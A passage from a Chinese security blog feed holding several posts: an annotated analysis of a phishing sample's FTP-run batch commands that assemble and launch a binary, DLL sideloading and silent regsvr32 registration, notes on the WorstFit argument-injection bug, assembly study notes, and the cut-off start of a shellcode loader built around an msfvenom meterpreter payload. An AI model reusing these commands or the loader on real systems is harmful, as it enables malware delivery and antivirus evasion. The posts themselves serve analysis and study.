    <content type="html"><![CDATA[<h1 id="01-引言"><a href="#01-引言" class="headerlink" title="01 引言"></a>01 引言</h1><p>吾爱上看到一篇病毒分析文章，初步看了一眼像是FTP执行LNK的方式，早在2022年甚至更早就公开的技术了，好像24年HVV期间用来社工钓鱼还火过一阵，借着这个机会学习记录一下<br>原文地址：<a href="https://www.52pojie.cn/thread-2054571-1-1.html">https://www.52pojie.cn/thread-2054571-1-1.html</a></p><h1 id="02-正文"><a href="#02-正文" class="headerlink" title="02 正文"></a>02 正文</h1><p>FTP的交互式命令行中，可以通过!的方式执行命令，如下图<br><img src="/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/01.png" alt="image"><br>还有一个命令行选项-s，可以批量执行某个文件中的命令，如下图<br><img src="/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/02.png" alt="image"></p><p>下面是钓鱼样本中的部分命令，在注释中有详细解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># copy /Y                       目的路径有同名文件时，不提示直接覆盖</span><br><span class="line"># &quot;_\_\_\_\_\_\_\_\doc\*.*&quot;     恶意攻击者刻意构造的多级目录，每级目录的名字都为_</span><br><span class="line"># &gt;nul                          正常copy一个文件，cmd会有输出，移动了哪些文件，此命令屏蔽这些输出</span><br><span class="line">!call copy /Y &quot;_\_\_\_\_\_\_\_\doc\*.*&quot; &quot;_\&quot; &gt;nul</span><br><span class="line"></span><br><span class="line"># 以最大化窗口用文件资源管理器打开目录_</span><br><span class="line">!call start /max explorer _</span><br><span class="line"></span><br><span class="line"># 创建目录C:\Users\Public\Update</span><br><span class="line">!call mkdir C:\Users\Public\Update &gt;nul</span><br><span class="line"></span><br><span class="line"># 拷贝多级目录下的header.doc到C:\Users\Public\Update下，并重命名为header</span><br><span class="line">!call copy /Y _\_\_\_\_\_\_\_\_rels\header.doc C:\Users\Public\Update\header &gt;nul</span><br><span class="line"></span><br><span class="line"># 拷贝多级目录下的sc.doc到C:\Users\Public\Update下，并重命名为sc</span><br><span class="line">!call copy /Y _\_\_\_\_\_\_\_\_rels\sc.doc C:\Users\Public\Update\sc &gt;nul</span><br><span class="line"></span><br><span class="line"># %time%是cmd内置的一个环境变量，echo后输出的是17:52:38.46这种形式，其中%TIME:~4,1%表示取索引4（第5个字符）开始的1个字符，也就是2，如果是%TIME:~3,2%就是取52</span><br><span class="line"># 因为没有完整的样本，猜测病毒作者前面已经将%TIME%复制给一个变量，否则调用%TIME:~4,1%取的值是不固定的</span><br><span class="line">!call copy /Y _\_\_\_\_\_\_\_\_rels\%TIME:~4,1%.doc C:\Users\Public\Update\shell32 &gt;nul</span><br><span class="line"></span><br><span class="line"># %random%是cmd内置的一个环境变量，随机生成一个0-32767之间的整数，包含0和32767</span><br><span class="line"># 随机生成一个0-32767之间的整数，追加到shell32中</span><br><span class="line">!call echo %RANDOM%&gt;&gt;C:\Users\Public\Update\shell32 &gt;nul</span><br><span class="line"></span><br><span class="line"># copy /b     表示拷贝一个二进制文件</span><br><span class="line"># copy在合并多个文件时使用连接符+，本条命令中，连接header和shell32后，重命名为（例如）360.3</span><br><span class="line">!call copy /Y /b C:\Users\Public\Update\header+C:\Users\Public\Update\shell32 C:\Users\Public\Update\360.%TIME:~4,1% &gt;nul</span><br><span class="line"></span><br><span class="line"># 合并header和WindowsSecurity.doc，并重命名为（例如）4.exe</span><br><span class="line">!call copy /Y /b C:\Users\Public\Update\header+_\_\_\_\_\_\_\_\_rels\WindowsSecurity.doc C:\Users\Public\Update\%TIME:~3,1%.exe &gt;nul</span><br><span class="line"></span><br><span class="line"># 因为没有完整的样本，猜测病毒作者前面已经将%TIME%复制给一个变量，否则每次调用%TIME:~3,1%取的值是变动的</span><br><span class="line"># 调用4.exe -InstallLsp 360.3</span><br><span class="line">!call start C:\Users\Public\Update\%TIME:~3,1%.exe -InstallLsp C:\Users\Public\Update\360.%TIME:~4,1% &gt;nul</span><br><span class="line"></span><br><span class="line"># 如果不存在WinVer.dll的话，将header.doc和WinVer.doc合并后重命名为WinVer.dll</span><br><span class="line"># regsvr32通常用来注册dll，注册后系统可以使用dll中的函数，这里用regsvr32静默注册WinVer.dll，静默的意思是成功或失败都没有提示</span><br><span class="line">!IF NOT EXIST C:\Users\Public\WinVer.dll (copy /Y /b _\_\_\_\_\_\_\_\_rels\header.doc+_\_\_\_\_\_\_\_\_rels\WinVer.doc C:\Users\Public\WinVer.dll &amp;&amp; regsvr32 /s C:\Users\Public\WinVer.dll)</span><br><span class="line"></span><br><span class="line"># ftp下的退出命令</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>AI查询下-InstallLsp，一般是Windows下第三方开发的流量类工具会用到此参数，猜测利用白加黑技术，4.exe是白exe，360.3是黑dll，后续就是常规的解密shellcode、执行shellcode，可以在x64dbg中对常见危险函数下断点，然后dump内存，由于没有样本无法进行进一步分析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;01-引言&quot;&gt;&lt;a href=&quot;#01-引言&quot; class=&quot;headerlink&quot; title=&quot;01 引言&quot;&gt;&lt;/a&gt;01 引言&lt;/h1&gt;&lt;p&gt;吾爱上看到一篇病毒分析文章，初步看了一眼像是FTP执行LNK的方式，早在2022年甚至更早就公开的技术了，好像24年</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>“WorstFit”学习</title>
    <link href="http://example.com/2025/08/14/%E2%80%9CWorstFit%E2%80%9D%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/08/14/%E2%80%9CWorstFit%E2%80%9D%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-08-14T13:56:08.000Z</published>
    <updated>2025-10-09T14:16:42.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>翻推特时看到Orange的一篇文章：“WorstFit: Unveiling Hidden Transformers in Windows ANSI!”，被标题吸引点进去看看，仔细研读后发现，文章展现了一个新的攻击面，漏洞很精彩。<br>由于时间有限这里只做一个简单的学习笔记。文中甚至揭露了ElFinder在Windows下的一个后台RCE 0day（ElFinder是一款开源的基于PHP的Web文件管理系统）</p><p>原文链接：<a href="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/">https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/</a></p><h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><h2 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h2><p>Windows最初用的字符集是ANSI，后来扩展到Unicode字符集，但Windows承诺永远向后兼容，所以现在仍然兼容ANSI字符集。兼容ANSI字符集的方式是，内部有一个API RtlUnicodeStringToAnsiString（或者WideCharToMultiByte）将Unicode字符转换为ANSI字符。我们都知道，Windows下的GetCurrentDirectoryA()使用ANSI字符集，GetCurrentDirectoryW()使用Unicode字符集，也就是说，当传入Unicode字符，并且调用ANSI API时，会在内部调用RtlUnicodeStringToAnsiString（或者WideCharToMultiByte）</p><h2 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h2><p>我们常用的C语言写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char* argv[], char* envp[]) &#123;</span><br><span class="line">    for (int i = 0; i &lt; argc; ++i)</span><br><span class="line">        printf(&quot;argv[%d] = %s\n&quot;, i, argv[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编译时会秘密生成函数mainCRTStartup，而mainCRTStartup内部会调用GetCommandLineA，也就是说，当输入是Unicode字符集时，凡是这样写的程序，都有上述漏洞，现今的输入基本都是Unicode字符，这样的话，影响面就很大了，其中包括著名的curl、openssl等</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>目前为止都没有问题，可是当代一些新奇的字符如 emojis ✅, áccènted letters, 𝒻𝒶𝓃𝒸𝓎 𝕤𝕪𝕞𝕓𝕠𝕝𝕤 and CJK 匚卄八尺八匚ㄒヨ尺丂 等在转换为ANSI时会产生意想不到的结果，具体而言是，看起来像双引号的U+ff02会被转换为双引号0x0022，也就是说php中的escapeshellarg并不是完全可靠，有了WorstFit，在Windows下是可以绕过的，也就造成了上面说的ElFinder在Windows下的一个后台RCE 0day。这个漏洞看完就感觉很奇妙，具体细节可以去看原文，确实产生了一个新的攻击面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;翻推特时看到Orange的一篇文章：“WorstFit: Unveiling Hidden Transformers in Windows </summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows下32位汇编学习</title>
    <link href="http://example.com/2025/08/14/Windows%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/08/14/Windows%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-08-14T13:33:37.000Z</published>
    <updated>2025-10-09T14:29:00.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>DOS下16位汇编学的时候完全就是硬啃，因为和现在用到的知识几乎不沾边，Windows下32位汇编开始涉及我们用到的知识，学起来还有点动力，本篇博客简单记录下Windows下32位汇编的学习总结</p><p>我用的罗云彬老师那本“Windows环境下32位汇编语言程序设计（第二版）”，电子版位于：<a href="https://github.com/ybdt/evasion-hub/tree/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90">https://github.com/ybdt/evasion-hub/tree/master/学习资源</a></p><h1 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h1><h2 id="CPU工作模式"><a href="#CPU工作模式" class="headerlink" title="CPU工作模式"></a>CPU工作模式</h2><p>从DOS下16位汇编到Windows下32位汇编，CPU的工作模式也从实模式变为保护模式（其实还有实模式和虚拟86模式，但本篇博客意在总结只挑重点说），这时CPU里的寄存器已经从16位变为32位，寻址空间也从之前的1MB变为4GB，并且多了两个东西，一个是内存分页机制，一个是优先级，内存分页机制可以为虚拟内存提供良好支持，后面内存管理中会提到，优先级包含4个级别，0-3级，0级就是常说的内核层ring0级，3级就是应用程序层ring3级，由于历史原因，Windows操作系统不使用1级和2级</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>保护模式下Windows的内存管理和实模式下DOS的内存管理有很大不同，DOS下内存管理通过两个16位的寄存器得到一个20位地址，也就是最终的物理地址，而在保护模式下，首先，寄存器变为32位，2的32次幂=4GB，也就是说单个寄存器即可寻址4GB，不再需要之前（段地址:偏移地址）的形式，其次，由于内存分页机制，内存被分为一个个4KB大小的页，这些物理上不相邻的4KB大小的页通过一个叫“页表”的映射器，映射为虚拟地址，供操作系统和应用程序使用，人们常说的应用程序可以使用4GB，其实是因为CPU是一个分时处理器，例如，在0.001-0.002这个时间段，全部的4GB内存属于程序A，在0.002-0.003这个时间段，全部的4GB内存属于程序B，在0.003-0.004这个时间段，全部的4GB内存属主又切换回程序A，大概就是这个意思，从物理上看，实际的一块内存地址，可能上一秒属于程序A，下一秒属于程序B，从逻辑上看，一块内存地址，一直属于程序A</p><h2 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h2><p>中断指当程序执行过程中有更重要的事情需要实时处理，通过中断控制器通知CPU，CPU保存好当前程序的地址后，转到中断处理程序，处理完后再通过保存的地址回来，异常指遇到指令异常、除法除0、权限异常等问题，转到异常处理程序，处理过程和中断处理程序一样，DOS下的中断和异常可以由用户控制，但是Windows下的中断和异常则有严格的限制，因为异常/中断处理程序的优先级比较高（优先级不高也没法优先进入中断），通过一个叫“门”的概念控制如何调用中断/异常处理程序</p><h1 id="0x03-代码演示"><a href="#0x03-代码演示" class="headerlink" title="0x03 代码演示"></a>0x03 代码演示</h1><p>Win32下汇编相比C语言不同的是，为语句找到他们该去的地方，比如代码段，数据段，堆栈段等，下面看一个反汇编例子<br>C语言代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// 简单的函数，接受两个参数并返回它们的和</span><br><span class="line">int add(int a, int b) &#123;</span><br><span class="line">    int result;       // 局部变量</span><br><span class="line">    result = a + b;   // 执行加法运算</span><br><span class="line">    return result;    // 返回结果</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int x = 5;        // 第一个局部变量</span><br><span class="line">    int y = 3;        // 第二个局部变量</span><br><span class="line">    int sum;          // 用于存储结果的局部变量</span><br><span class="line">    </span><br><span class="line">    sum = add(x, y);  // 调用add函数</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Sum: %d\n&quot;, sum);  // 打印结果</span><br><span class="line">    return 0;         // 程序结束</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的反汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">; main函数部分</span><br><span class="line">main:</span><br><span class="line">    push    ebp         ; 保存旧的基址指针到堆栈</span><br><span class="line">    mov     ebp, esp    ; 设置新的基址指针，指向当前栈顶</span><br><span class="line">    sub     esp, 16     ; 在栈上分配16字节空间给局部变量</span><br><span class="line">    </span><br><span class="line">    ; 初始化局部变量x = 5</span><br><span class="line">    mov     DWORD PTR [ebp-4], 5</span><br><span class="line">    </span><br><span class="line">    ; 初始化局部变量y = 3</span><br><span class="line">    mov     DWORD PTR [ebp-8], 3</span><br><span class="line">    </span><br><span class="line">    ; 准备调用add函数，先将参数压栈</span><br><span class="line">    mov     eax, DWORD PTR [ebp-8]  ; 获取y的值</span><br><span class="line">    push    eax                     ; 将y压栈（第二个参数）</span><br><span class="line">    mov     eax, DWORD PTR [ebp-4]  ; 获取x的值</span><br><span class="line">    push    eax                     ; 将x压栈（第一个参数）</span><br><span class="line">    </span><br><span class="line">    call    add                     ; 调用add函数，会将返回地址压栈</span><br><span class="line">    add     esp, 8                  ; 清理栈上的函数参数</span><br><span class="line">    </span><br><span class="line">    ; 将add函数的返回值保存到sum变量</span><br><span class="line">    mov     DWORD PTR [ebp-12], eax</span><br><span class="line">    </span><br><span class="line">    ; 准备调用printf函数</span><br><span class="line">    mov     eax, DWORD PTR [ebp-12]</span><br><span class="line">    push    eax                     ; 将sum作为参数压栈</span><br><span class="line">    push    OFFSET FLAT:.LC0        ; 将格式化字符串地址压栈</span><br><span class="line">    call    printf                  ; 调用printf</span><br><span class="line">    add     esp, 8                  ; 清理栈上的参数</span><br><span class="line">    </span><br><span class="line">    ; 函数返回</span><br><span class="line">    mov     eax, 0                  ; 返回值0</span><br><span class="line">    leave                           ; 相当于mov esp, ebp; pop ebp</span><br><span class="line">    ret                             ; 返回</span><br><span class="line"></span><br><span class="line">; add函数部分</span><br><span class="line">add:</span><br><span class="line">    push    ebp         ; 保存main函数的基址指针</span><br><span class="line">    mov     ebp, esp    ; 设置当前函数的基址指针</span><br><span class="line">    sub     esp, 16     ; 为局部变量分配空间</span><br><span class="line">    </span><br><span class="line">    ; 计算a + b，并保存到result</span><br><span class="line">    mov     eax, DWORD PTR [ebp+8]  ; 获取第一个参数a</span><br><span class="line">    add     eax, DWORD PTR [ebp+12] ; 加上第二个参数b</span><br><span class="line">    mov     DWORD PTR [ebp-4], eax  ; 保存结果到result</span><br><span class="line">    </span><br><span class="line">    ; 返回结果</span><br><span class="line">    mov     eax, DWORD PTR [ebp-4]  ; 将result放入eax寄存器作为返回值</span><br><span class="line">    leave                           ; 清理堆栈</span><br><span class="line">    ret                             ; 返回，弹出返回地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反汇编代码解读：<br>1、首先是常规的EBP入栈，用于保存上一个栈基址指针<br>2、然后将栈顶指针（ESP）的值赋给栈基址指针（EBP）<br>3、栈向下延伸16字节<br>4、接下来该调用函数add了，此时EBP-4是第一个局部变量x的地址，EBP-8是第二个局部变量y的地址，由于C/C++遵循的调用标准是cdecl，也就是参数入栈时是从右向左，所以先将局部变量y入栈，再将局部变量x入栈<br>5、程序准备进入函数add的栈帧，进入之前会先把返回地址压入栈<br>6、进入函数add的栈帧后，同样是EBP、ESP那一套<br>7、此时以当前栈帧的EBP为基址，变量x和变量y的地址就应该是EBP+8和EBP+12，计算完后弹出返回地址，继续执行函数add后面的指令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;DOS下16位汇编学的时候完全就是硬啃，因为和现在用到的知识几乎不沾边，Windows下32位汇编开</summary>
      
    
    
    
    <category term="汇编语言" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>DOS下16位汇编学习</title>
    <link href="http://example.com/2025/08/05/DOS%E4%B8%8B16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/08/05/DOS%E4%B8%8B16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-08-05T08:09:22.000Z</published>
    <updated>2025-10-09T14:25:29.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>汇编语言不学总感觉差点东西，那就开整，我用的是王爽老师那本汇编语言第三版，也可以看B站上“零点Boy”老师的视频课程，参考的也是王爽老师那本汇编语言讲的</p><p>电子版：<a href="https://github.com/ybdt/evasion-hub/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E7%AC%AC3%E7%89%88%EF%BC%89%E7%8E%8B%E7%88%BD%E8%91%97.pdf">这里</a></p><p>本文只是简单记录下这段时间的学习感受</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>汇编语言是和操作系统强相关的低级语言，DOS下16位汇编、Windows下32位汇编、Linux下汇编可以说是“三门语言”，不像C、C++、JAVA这种高级语言，是跨平台的。王爽老师那本汇编语言讲的就是DOS下16位汇编，现在到处都是64的Windows，16位的DOS汇编属实有点过时了，但是知识都是一点点演化的，想了解汇编是怎么来的，这本书的基础部分我觉得还是有用的</p><p>16位DOS汇编寄存器是16位的，但寻址总线是20位的，所以CPU内部会有一个转换器，转换器的基本逻辑是，将两个16位寄存器（也就是两个16位二进制）经过转换变成一个20位二进制，寻址方式是   段地址:偏移地址</p><p>汇编代码之所以看起来像天书，就是因为它有很多隐藏知识，例如下述代码，ds寄存器默认被用来存放段地址，再结合偏移地址，便得到了某个字符串的起始地址，然后对字符串进行异或操作，便可以将大写变为小写，将小写变为大写（注意：32位CPU的通用寄存器变为：EAX、EBX、ECX、EDX，64位CPU的通用寄存器变为：RAX、RBX、RCX、RDX）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data</span><br><span class="line">data segment</span><br><span class="line">db &quot;BASIC&quot;</span><br><span class="line">db &quot;minix&quot;</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start: mov ax, data</span><br><span class="line"> mov ds, ax</span><br><span class="line"> </span><br><span class="line"> mov bx, 0</span><br><span class="line"> mov cx, 5</span><br><span class="line">s1:mov al, [bx]</span><br><span class="line">   and al, 11011111b ; convert to upper-case</span><br><span class="line">   mov [bx], al</span><br><span class="line">   inc bx</span><br><span class="line">   loop s1</span><br><span class="line">   </span><br><span class="line">   mov bx, 5</span><br><span class="line">   mov cx, 5</span><br><span class="line">s2:mov al, [bx]</span><br><span class="line">   or al, 00100000b ; convert to lower-case</span><br><span class="line">   mov [bx], al</span><br><span class="line">   inc bx</span><br><span class="line">   loop s2</span><br><span class="line">   </span><br><span class="line">   mov ax, 4c000h</span><br><span class="line">   int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="/2025/08/05/DOS%E4%B8%8B16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/01.png" alt="01"></p><p>16位DOS汇编中用到的主要寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">AX：通用寄存器，通常用于存放程序运行过程中产生的临时值，可以简易理解为C语言中的变量</span><br><span class="line"></span><br><span class="line">BX：通用寄存器，除了存放临时值，常结合SI、DI存放内存地址</span><br><span class="line"></span><br><span class="line">CX：通用寄存器，除了存放临时值，还用作循环计数器</span><br><span class="line"></span><br><span class="line">DX：通用寄存器，通常用于存放程序运行过程中产生的临时值，可以简易理解为C语言中的变量</span><br><span class="line"></span><br><span class="line">CS：Code Segment，代码段寄存器，里面存放要执行的指令的段地址</span><br><span class="line"></span><br><span class="line">IP：Instruction Pointer，指令指针寄存器，里面存放要执行指令的偏移地址</span><br><span class="line"></span><br><span class="line">DS：Data Segment，数据段寄存器，里面存放要访问的数据的段地址</span><br><span class="line"></span><br><span class="line">SS：Stack Segment，栈段寄存器，里面存放栈的段地址</span><br><span class="line"></span><br><span class="line">SP：Stack Pointer，栈指针寄存器，里面存放栈的偏移地址</span><br><span class="line"></span><br><span class="line">ES：Extra Segment，附加段寄存器</span><br><span class="line"></span><br><span class="line">SI：Source Index，源变址寄存器，里面存放可变的内存地址</span><br><span class="line"></span><br><span class="line">DI：Destination Index，目的变址寄存器，里面存放可变的内存地址</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;汇编语言不学总感觉差点东西，那就开整，我用的是王爽老师那本汇编语言第三版，也可以看B站上“零点Boy”老师的视频课程，参考的也是王爽老师那本</summary>
      
    
    
    
    <category term="汇编语言" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>利用NtReadVirtualMemory实现IAT中规避高危API</title>
    <link href="http://example.com/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/"/>
    <id>http://example.com/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/</id>
    <published>2025-07-28T13:59:40.000Z</published>
    <updated>2025-10-09T14:17:43.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前世"><a href="#前世" class="headerlink" title="前世"></a>前世</h1><h2 id="Win32-API"><a href="#Win32-API" class="headerlink" title="Win32 API"></a>Win32 API</h2><p>Win32 API实现最简单的Shellcode Loader如下，代码中包含注释，可以看到每条语句的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// msfvenom -p windows/meterpreter/reverse_https lhost=xxx lport=xxx -f c</span><br><span class="line">unsigned char shellcode[] =</span><br><span class="line">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52&quot;</span><br><span class="line">...</span><br><span class="line">&quot;\x30\x2e\x32\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 分配内存</span><br><span class="line">    LPVOID allocatedMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, 